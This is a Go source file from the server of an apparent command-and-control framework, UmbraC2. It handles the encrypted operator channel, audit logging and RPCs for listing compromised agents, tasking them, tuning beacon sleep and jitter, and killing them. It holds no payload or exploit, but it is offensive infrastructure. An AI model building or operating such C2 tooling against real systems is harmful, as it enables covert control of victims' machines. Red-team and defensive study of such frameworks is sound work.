package link

import (
	"fmt"
	"log/slog"
	"net"
	"sort"
	"strings"
	"time"

	"github.com/thesyntax1/UmbraC2/server/internal/audit"
	"github.com/thesyntax1/UmbraC2/server/internal/crypt"
	"github.com/thesyntax1/UmbraC2/server/internal/hub"
	"github.com/thesyntax1/UmbraC2/server/internal/store"
	"github.com/thesyntax1/UmbraC2/server/internal/upk"
	"github.com/thesyntax1/UmbraC2/server/internal/wire"
)

// Task kinds the server itself is allowed to synthesise.
const (
	TaskKindExit = "exit"
)

// serveOperatorTCP runs a persistent operator control channel.
func (s *Server) serveOperatorTCP(conn net.Conn) {
	defer conn.Close()
	addr := conn.RemoteAddr().String()
	log := s.Log.With("peer", addr, "transport", "tcp/operator")

	if err := conn.SetDeadline(time.Now().Add(s.Cfg.HandshakeTimeout())); err != nil {
		return
	}
	stream := NewConnStream(conn)
	sess, info, err := Handshake(stream, s.Cfg, log, addr)
	if err != nil {
		s.guard.Fail(addr)
		log.Warn("operator handshake failed", "err", err)
		return
	}
	if info.Role != crypt.RoleOperator {
		log.Warn("agent key used on the operator listener")
		return
	}
	if !s.claimOperatorSlot() {
		log.Warn("operator limit reached, rejecting", "operator", info.ID)
		return
	}
	defer s.releaseOperatorSlot()
	if err := conn.SetDeadline(time.Time{}); err != nil {
		return
	}

	op := s.Hub.Subscribe(info.ID, addr, "tcp/operator")
	defer s.Hub.Unsubscribe(op.ID)
	defer s.forgetOperatorRate(info.ID)
	log.Info("operator connected", "operator", info.ID, "suite", wire.SuiteName(info.Suite))

	// The event pusher and the request handler below both write to this
	// connection, so every frame goes through one Sender to keep the peer's
	// nonce counter strictly increasing. See sender.go.
	send := NewSender(sess, stream)

	done := make(chan struct{})
	defer close(done)

	// Push events to the operator as they happen.
	go func() {
		for {
			select {
			case ev, ok := <-op.Events:
				if !ok {
					return
				}
				if err := send.Send(wire.MsgOpEvent, eventMap(ev)); err != nil {
					log.Debug("operator event write failed", "err", err)
					return
				}
			case <-done:
				return
			}
		}
	}()

	for {
		raw, err := stream.ReadFrame()
		if err != nil {
			log.Info("operator disconnected", "operator", info.ID)
			return
		}
		msgType, req, err := sess.OpenMessage(raw)
		if err != nil {
			log.Warn("operator frame rejected", "err", err)
			return
		}
		if msgType != wire.MsgOpRequest {
			log.Warn("unexpected frame from operator", "type", wire.TypeName(msgType))
			continue
		}
		resp := s.dispatch(log, op, req)
		if err := send.Send(wire.MsgOpResponse, resp); err != nil {
			log.Warn("operator response write failed", "err", err)
			return
		}
	}
}

// dispatch executes one operator RPC. Errors are returned *inside* the
// response so the operator UI can show them without losing the session.
// dispatch executes one RPC and records it in the audit log.
//
// Auditing wraps the real handler rather than living inside it so that no RPC
// can be added without being logged: there is exactly one code path in.
func (s *Server) dispatch(log *slog.Logger, op *hub.Operator, req map[string]any) upk.Map {
	started := time.Now()
	cmd, _ := req["cmd"].(string)
	args, _ := req["args"].(map[string]any)
	if args == nil {
		args = map[string]any{}
	}

	out := s.handleRPC(log, op, req)
	ok, _ := out["ok"].(bool)
	errText, _ := out["err"].(string)

	var taskID, agentID string
	if out["data"] != nil {
		if data, isMap := out["data"].(upk.Map); isMap {
			taskID, _ = data["task_id"].(string)
			agentID, _ = data["agent_id"].(string)
		}
	}
	if taskID == "" {
		taskID, _ = args["task_id"].(string)
	}
	if agentID == "" {
		agentID, _ = args["id"].(string)
	}
	s.record(op, cmd, args, ok, errText, agentID, taskID, time.Since(started).Milliseconds())
	return out
}

// record writes one audit line. Auditing never fails an RPC: a disk problem is
// logged, because refusing to work is worse than a gap in the trail.
func (s *Server) record(op *hub.Operator, cmd string, args map[string]any, ok bool, errText, agentID, taskID string, ms int64) {
	if s.audit == nil {
		return
	}
	// Sorted key=value rather than %v of a map: the audit log is diffed and
	// grepped, and Go randomises map iteration order.
	detail := ""
	if len(args) > 0 {
		keys := make([]string, 0, len(args))
		for k := range args {
			keys = append(keys, k)
		}
		sort.Strings(keys)
		parts := make([]string, 0, len(keys))
		for _, k := range keys {
			parts = append(parts, fmt.Sprintf("%s=%v", k, args[k]))
		}
		detail = audit.Clip(strings.Join(parts, " "))
	}
	name := ""
	peer, transport := "", ""
	if op != nil {
		name, peer, transport = op.Name, op.Peer, op.Transport
	}
	err := s.audit.Record(audit.Entry{
		Operator:  name,
		Peer:      peer,
		Transport: transport,
		Cmd:       cmd,
		OK:        ok,
		Err:       errText,
		AgentID:   agentID,
		TaskID:    taskID,
		Detail:    detail,
		Millis:    ms,
	})
	if err != nil {
		s.Log.Warn("audit write failed", "err", err, "cmd", cmd, "operator", name)
	}
}

func (s *Server) handleRPC(log *slog.Logger, op *hub.Operator, req map[string]any) upk.Map {
	rid, _ := number(req["rid"])
	cmd, _ := req["cmd"].(string)
	args, _ := req["args"].(map[string]any)
	if args == nil {
		args = map[string]any{}
	}
	resp := upk.Map{"rid": rid, "ok": false, "data": upk.Map{}}

	reply := func(data upk.Map) upk.Map {
		resp["ok"] = true
		resp["data"] = data
		return resp
	}
	fail := func(format string, a ...any) upk.Map {
		resp["err"] = fmt.Sprintf(format, a...)
		return resp
	}

	log.Debug("operator rpc", "operator", op.Name, "cmd", cmd)

	// The limiter sits inside the handler so a rate-limited call is still
	// audited: "operator tried to flood" is exactly the kind of thing the log
	// exists to show.
	if !s.allowOperatorRPC(op.Name) {
		return fail("rate limited: at most %d calls/s per operator", int(operatorRPCPerSec))
	}

	switch strings.TrimSpace(cmd) {
	case "ping":
		return reply(upk.Map{"pong": time.Now().Unix()})

	case "audit.tail":
		limit, ok := asInt64(args["limit"])
		if !ok || limit <= 0 {
			limit = 50
		}
		if limit > 1000 {
			limit = 1000
		}
		entries := s.audit.Tail(int(limit))
		out := make([]any, 0, len(entries))
		for _, e := range entries {
			out = append(out, upk.Map{
				"at":        e.At.Unix(),
				"operator":  e.Operator,
				"peer":      e.Peer,
				"transport": e.Transport,
				"cmd":       e.Cmd,
				"ok":        e.OK,
				"err":       e.Err,
				"agent_id":  e.AgentID,
				"task_id":   e.TaskID,
				"detail":    e.Detail,
				"ms":        e.Millis,
			})
		}
		return reply(upk.Map{"entries": out, "enabled": s.audit.Enabled()})

	case "server.stats":
		return reply(toUpkMap(s.Hub.Stats()))

	case "operators.list":
		ops := s.Hub.Operators()
		out := make([]any, 0, len(ops))
		for _, o := range ops {
			out = append(out, upk.Map{
				"id":        o.ID,
				"name":      o.Name,
				"peer":      o.Peer,
				"transport": o.Transport,
				"since":     o.Since,
				"backlog":   int64(o.Backlog),
			})
		}
		return reply(upk.Map{"operators": out, "count": int64(len(out))})

	case "agents.list":
		agents := s.Hub.Agents()
		out := make([]any, 0, len(agents))
		for _, a := range agents {
			out = append(out, toUpkMap(a))
		}
		return reply(upk.Map{"agents": out})

	case "agents.info":
		id, _ := args["id"].(string)
		a, ok := s.Hub.Store().Agent(id)
		if !ok {
			return fail("unknown agent %q", id)
		}
		hist := s.Hub.Store().AgentTasks(id, 20)
		tasks := make([]any, 0, len(hist))
		for _, t := range hist {
			tasks = append(tasks, taskMap(t))
		}
		data := toUpkMap(agentDataMap(a))
		data["tasks"] = tasks
		if live, ok := s.Hub.Live(id); ok {
			data["live"] = upk.Map{
				"transport": live.Transport,
				"addr":      live.Addr,
				"suite":     wire.SuiteName(live.Suite),
				"since":     live.Since.Format(time.RFC3339),
				"session":   live.SessionID,
			}
		}
		return reply(data)

	case "task.submit":
		id, _ := args["id"].(string)
		kind, _ := args["kind"].(string)
		taskArgs, _ := args["args"].(map[string]any)
		t, err := s.Hub.SubmitTask(id, kind, taskArgs)
		if err != nil {
			return fail("task.submit: %v", err)
		}
		return reply(upk.Map{"task_id": t.ID, "agent_id": t.AgentID, "state": t.State})

	case "task.cancel":
		taskID, _ := args["task_id"].(string)
		if !s.Hub.CancelTask(taskID) {
			return fail("task %q cannot be cancelled", taskID)
		}
		return reply(upk.Map{"task_id": taskID, "state": store.TaskCancelled})

	case "task.list":
		id, _ := args["id"].(string)
		limit, ok := asInt64(args["limit"])
		if !ok || limit <= 0 {
			limit = 50
		}
		hist := s.Hub.Store().AgentTasks(id, int(limit))
		tasks := make([]any, 0, len(hist))
		for _, t := range hist {
			tasks = append(tasks, taskMap(t))
		}
		return reply(upk.Map{"tasks": tasks})

	case "task.get":
		taskID, _ := args["task_id"].(string)
		t, ok := s.Hub.Store().Task(taskID)
		if !ok {
			return fail("unknown task %q", taskID)
		}
		return reply(taskMap(t))

	case "agents.sleep":
		id, _ := args["id"].(string)
		sleep, ok1 := asInt64(args["sleep"])
		jitter, ok2 := asInt64(args["jitter"])
		if !ok1 || !ok2 {
			return fail("agents.sleep needs numeric sleep and jitter")
		}
		if err := s.Hub.SetPolicy(id, int(sleep), int(jitter)); err != nil {
			return fail("agents.sleep: %v", err)
		}
		return reply(upk.Map{"id": id, "sleep": sleep, "jitter": jitter})

	case "agents.kill", "agents.exit":
		id, _ := args["id"].(string)
		t, err := s.Hub.SubmitTask(id, TaskKindExit, map[string]any{})
		if err != nil {
			return fail("%s: %v", cmd, err)
		}
		return reply(upk.Map{"task_id": t.ID, "agent_id": id})

	case "events.test":
		s.Hub.Emit(hub.Event{Kind: "operator.test", Data: map[string]any{"from": op.Name}})
		return reply(upk.Map{"emitted": true})

	default:
		return fail("unknown command %q", cmd)
	}
}

func eventMap(ev hub.Event) upk.Map {
	m := upk.Map{
		"kind": ev.Kind,
		"at":   ev.At.Unix(),
	}
	if ev.AgentID != "" {
		m["agent_id"] = ev.AgentID
	}
	if ev.TaskID != "" {
		m["task_id"] = ev.TaskID
	}
	if ev.Data != nil {
		m["data"] = toUpkMap(ev.Data)
	}
	return m
}

func taskMap(t *store.Task) upk.Map {
	m := upk.Map{
		"id":       t.ID,
		"agent_id": t.AgentID,
		"kind":     t.Kind,
		"state":    t.State,
		"code":     t.Code,
		"args":     toUpkMap(t.Args),
		"created":  t.Created.Unix(),
	}
	if t.Err != "" {
		m["err"] = t.Err
	}
	if len(t.Output) > 0 {
		m["out"] = t.Output
	}
	if !t.Completed.IsZero() {
		m["completed"] = t.Completed.Unix()
	}
	return m
}

func agentDataMap(a *store.Agent) map[string]any {
	return map[string]any{
		"id":         a.ID,
		"host":       a.Host,
		"os":         a.OS,
		"arch":       a.Arch,
		"user":       a.User,
		"pid":        a.PID,
		"version":    a.Version,
		"transport":  a.Transport,
		"addr":       a.Addr,
		"sleep":      a.Sleep,
		"jitter":     a.Jitter,
		"state":      a.State,
		"checkins":   a.Checkins,
		"first_seen": a.FirstSeen.Format(time.RFC3339),
		"last_seen":  a.LastSeen.Format(time.RFC3339),
	}
}

// toUpkMap converts arbitrary maps into upk-encodable maps, dropping values the
// encoder cannot represent (never silently corrupting a payload).
func toUpkMap(in map[string]any) upk.Map {
	out := make(upk.Map, len(in))
	for k, v := range in {
		out[k] = upkValue(v)
	}
	return out
}

func upkValue(v any) any {
	switch x := v.(type) {
	case nil, bool, string, []byte, int, int64, uint64, float64, []any:
		return x
	case int32:
		return int64(x)
	case uint32:
		return uint64(x)
	case uint:
		return uint64(x)
	case map[string]any:
		return toUpkMap(x)
	case map[string]string:
		m := make(upk.Map, len(x))
		for k, val := range x {
			m[k] = val
		}
		return m
	case []map[string]any:
		out := make([]any, 0, len(x))
		for _, item := range x {
			out = append(out, toUpkMap(item))
		}
		return out
	case []string:
		out := make([]any, 0, len(x))
		for _, item := range x {
			out = append(out, item)
		}
		return out
	case time.Time:
		return x.UTC().Format(time.RFC3339)
	default:
		return fmt.Sprintf("%v", x)
	}
}
